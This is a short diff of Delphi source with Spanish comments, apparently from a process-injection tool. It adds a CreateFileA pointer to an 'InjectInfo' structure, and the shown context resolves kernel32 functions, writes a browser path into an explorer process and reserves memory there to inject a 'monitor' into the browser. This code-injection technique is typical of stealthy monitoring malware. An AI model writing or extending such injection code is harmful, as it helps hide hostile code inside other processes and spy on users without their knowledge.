@@ -14,6 +14,8 @@ type
     pSleep: Pointer;
     pCreateProcess: Pointer;
     pWaitForSingleObject: Pointer;
+    pCreateFile : Pointer;
+    
     lpPathBrowser: Pointer;
     lpProcInfo: Pointer;
     lpProcInfo2: Pointer;
@@ -37,7 +39,7 @@ begin
   InjectInfo.pBeep := GetProcAddress(GetModuleHandle('kernel32'), 'Beep'); //Para debug no viene mal
   InjectInfo.pCreateProcess := GetProcAddress(GetModuleHandle('kernel32'), 'CreateProcessA');
   InjectInfo.pWaitForSingleObject := GetProcAddress(GetModuleHandle('kernel32'), 'WaitForSingleObject');
-
+  InjectInfo.pCreateFile := GetProcAddress(GetModuleHandle('kernel32'), 'CreateFileA');
   //Despues inyectamos variables que utilizaremos
   InjectInfo.lpPathBrowser := InjectString(HExplorador, PChar(Navegador)); //Donde queramos inyectar el monitor
   InjectInfo.lpProcInfo := InjectMemory(HExplorador, nil, SizeOf(TProcessInformation)); //Reservamos memoria para procinfo
